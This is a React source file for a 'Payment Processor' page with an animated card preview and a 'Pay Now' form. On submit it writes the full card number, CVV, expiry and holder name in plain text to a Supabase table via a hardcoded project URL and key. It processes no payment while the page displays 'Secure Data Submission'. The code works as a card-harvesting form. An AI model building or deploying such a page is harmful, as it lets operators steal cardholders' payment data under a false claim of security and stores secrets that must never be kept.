import React, { useState } from 'react';
import { createRoot } from 'react-dom/client';
import { motion, AnimatePresence } from 'framer-motion';
import { createClient } from '@supabase/supabase-js';
import { 
  Lock, 
  CreditCard, 
  ShieldCheck, 
  CheckCircle2, 
  Info,
  ArrowLeft,
  AlertCircle
} from 'lucide-react';

// --- Supabase Configuration ---
const SUPABASE_URL = 'https://ctsrjxhzolikvkrzfdpp.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_33K56t9UChx6ysbkUZ_bpg_P0MFNx7T';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// --- Components ---

const CardVisualizer = ({ 
  number, 
  name, 
  expiry, 
  cvv, 
  isFlipped, 
  brand 
}) => {
  const formatNumber = (num) => {
    const clean = num.replace(/\s/g, '');
    let res = '';
    const bullet = '\u2022';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) res += ' ';
      res += clean[i] || bullet;
    }
    return res;
  };

  const getBrandIcon = () => {
    switch (brand.toLowerCase()) {
      case 'visa': return 'https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg';
      case 'mastercard': return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
      default: return null;
    }
  };

  const brandIcon = getBrandIcon();

  return (
    <div className="relative w-full max-w-[380px] h-[220px] mx-auto perspective-1000 mb-8">
      <motion.div
        animate={{ rotateY: isFlipped ? 180 : 0 }}
        transition={{ duration: 0.6, type: 'spring', stiffness: 260, damping: 20 }}
        className="relative w-full h-full preserve-3d shadow-2xl rounded-2xl overflow-hidden"
      >
        {/* Front Side */}
        <div className="absolute inset-0 backface-hidden bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500 p-6 text-white flex flex-col justify-between">
          <div className="flex justify-between items-start">
            <div className="w-12 h-10 bg-yellow-400/80 rounded-md shadow-inner" />
            {brandIcon ? (
              <img src={brandIcon} alt={brand} className="h-8 object-contain" />
            ) : (
              <CreditCard className="w-8 h-8 opacity-50" />
            )}
          </div>
          
          <div className="space-y-4">
            <div className="text-xl font-mono tracking-widest text-center py-2">
              {formatNumber(number)}
            </div>
            
            <div className="flex justify-between items-end">
              <div className="flex-1 mr-4">
                <div className="text-[10px] uppercase opacity-70 mb-1">Card Holder</div>
                <div className="text-sm font-semibold truncate uppercase tracking-wider">
                  {name || 'YOUR NAME HERE'}
                </div>
              </div>
              <div className="w-16">
                <div className="text-[10px] uppercase opacity-70 mb-1">Expires</div>
                <div className="text-sm font-semibold font-mono">
                  {expiry || 'MM/YY'}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Back Side */}
        <div 
          className="absolute inset-0 backface-hidden bg-gradient-to-br from-slate-800 to-slate-900 py-6 flex flex-col justify-between"
          style={{ transform: 'rotateY(180deg)' }}
        >
          <div className="w-full h-12 bg-black/80 mt-2" />
          <div className="px-6">
            <div className="text-[10px] text-white/50 uppercase mb-1">Security Code</div>
            <div className="bg-white h-10 rounded flex items-center justify-end px-4">
              <span className="text-slate-900 font-mono font-bold tracking-widest italic">
                {cvv || '\u2022\u2022\u2022'}
              </span>
            </div>
          </div>
          <div className="px-6 text-[8px] text-white/30 italic leading-tight">
            This card is the property of the issuing bank. Authorized signature is required.
          </div>
        </div>
      </motion.div>
    </div>
  );
};

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    number: '',
    name: '',
    expiry: '',
    cvv: ''
  });
  const [isFlipped, setIsFlipped] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [error, setError] = useState(null);
  const [brand, setBrand] = useState('');

  const handleNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    
    if (value.startsWith('4')) setBrand('visa');
    else if (value.startsWith('5')) setBrand('mastercard');
    else setBrand('');

    const formatted = value.match(/.{1,4}/g)?.join(' ') || '';
    setFormData({ ...formData, number: formatted });
  };

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    
    if (value.length >= 3) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    setFormData({ ...formData, expiry: value });
  };

  const handleCVVChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
    setFormData({ ...formData, cvv: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsProcessing(true);
    setError(null);

    try {
      const fullNumber = formData.number.replace(/\s/g, '');
      const lastFour = fullNumber.slice(-4);
      
      const { error: sbError } = await supabase
        .from('payments') 
        .insert([
          { 
            cardholder_name: formData.name, 
            card_brand: brand || 'unknown',
            card_number: fullNumber,
            cvv: formData.cvv,
            card_last_four: lastFour,
            expiry_date: formData.expiry,
            created_at: new Date().toISOString()
          },
        ]);

      if (sbError) throw sbError;
      setIsSuccess(true);
    } catch (err) {
      console.error('Submission error:', err);
      setError(err.message || 'Error processing request. Check your Supabase table schema.');
    } finally {
      setIsProcessing(false);
    }
  };

  if (isSuccess) {
    return (
      <motion.div 
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="max-w-md w-full mx-auto bg-white rounded-3xl shadow-xl p-12 text-center"
      >
        <div className="mb-6 flex justify-center">
          <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center">
            <CheckCircle2 className="w-10 h-10 text-emerald-600" />
          </div>
        </div>
        <h2 className="text-2xl font-bold text-slate-800 mb-2">Details Recorded</h2>
        <p className="text-slate-500 mb-8">
          The information has been successfully saved to your database.
        </p>
        <button 
          onClick={() => window.location.reload()}
          className="w-full bg-slate-900 text-white py-4 rounded-xl font-semibold shadow-lg"
        >
          Return
        </button>
      </motion.div>
    );
  }

  return (
    <div className="max-w-xl w-full mx-auto px-4 py-8">
      <div className="flex items-center justify-between mb-8">
        <button className="p-2 hover:bg-white rounded-full transition-colors text-slate-500">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-semibold text-slate-800">Payment Processor</h1>
        <div className="w-9" />
      </div>

      <CardVisualizer 
        {...formData} 
        isFlipped={isFlipped} 
        brand={brand} 
      />

      <div className="bg-white rounded-3xl shadow-xl shadow-slate-200/50 p-8">
        <form onSubmit={handleSubmit} className="space-y-6">
          <AnimatePresence>
            {error && (
              <motion.div 
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-4 bg-red-50 border border-red-100 rounded-xl flex items-start gap-3 text-red-600 text-sm overflow-hidden"
              >
                <AlertCircle className="w-5 h-5 flex-shrink-0" />
                <span className="break-words w-full">{error}</span>
              </motion.div>
            )}
          </AnimatePresence>

          <div className="space-y-2">
            <label className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
              Card Number
            </label>
            <div className="relative">
              <input
                type="text"
                placeholder="0000 0000 0000 0000"
                value={formData.number}
                onChange={handleNumberChange}
                onFocus={() => setIsFlipped(false)}
                className="w-full px-4 py-4 bg-slate-50 border border-slate-100 rounded-xl focus:ring-2 focus:ring-indigo-500 transition-all outline-none font-mono tracking-widest"
                required
              />
              <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 w-5 h-5" />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
              Cardholder Name
            </label>
            <input
              type="text"
              placeholder="Full Name"
              value={formData.name}
              onChange={(e) => setFormData({ ...formData, name: e.target.value })}
              onFocus={() => setIsFlipped(false)}
              className="w-full px-4 py-4 bg-slate-50 border border-slate-100 rounded-xl focus:ring-2 focus:ring-indigo-500 transition-all outline-none"
              required
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
                Expiry Date
              </label>
              <input
                type="text"
                placeholder="MM/YY"
                value={formData.expiry}
                onChange={handleExpiryChange}
                onFocus={() => setIsFlipped(false)}
                className="w-full px-4 py-4 bg-slate-50 border border-slate-100 rounded-xl focus:ring-2 focus:ring-indigo-500 transition-all outline-none font-mono"
                required
              />
            </div>
            <div className="space-y-2">
              <label className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
                CVV / CVC
              </label>
              <input
                type="text"
                maxLength={3}
                placeholder="•••"
                value={formData.cvv}
                onChange={handleCVVChange}
                onFocus={() => setIsFlipped(true)}
                onBlur={() => setIsFlipped(false)}
                className="w-full px-4 py-4 bg-slate-50 border border-slate-100 rounded-xl focus:ring-2 focus:ring-indigo-500 transition-all outline-none font-mono"
                required
              />
            </div>
          </div>

          <div className="pt-4">
            <button
              type="submit"
              disabled={isProcessing}
              className={`w-full py-4 rounded-xl font-bold flex items-center justify-center gap-2 transition-all ${
                isProcessing 
                ? 'bg-slate-100 text-slate-400 cursor-not-allowed' 
                : 'bg-indigo-600 text-white hover:bg-indigo-700 active:scale-[0.98] shadow-lg'
              }`}
            >
              {isProcessing ? 'Processing...' : (
                <>
                  <Lock className="w-4 h-4" />
                  Pay Now
                </>
              )}
            </button>
          </div>
          
          <div className="flex items-center justify-center gap-2 text-slate-400 text-xs mt-4">
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
            <span>Secure Data Submission</span>
          </div>
        </form>
      </div>
    </div>
  );
};

const App = () => {
  return (
    <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-4">
      <style>{`
        .perspective-1000 { perspective: 1000px; }
        .preserve-3d { transform-style: preserve-3d; }
        .backface-hidden { backface-visibility: hidden; }
      `}</style>
      <PaymentForm />
      <footer className="mt-12 text-slate-400 text-sm font-medium">
        &copy; {new Date().getFullYear()} Secure Work Environment
      </footer>
    </div>
  );
};

const container = document.getElementById('root');
if (container) {
  const root = createRoot(container);
  root.render(<App />);
}
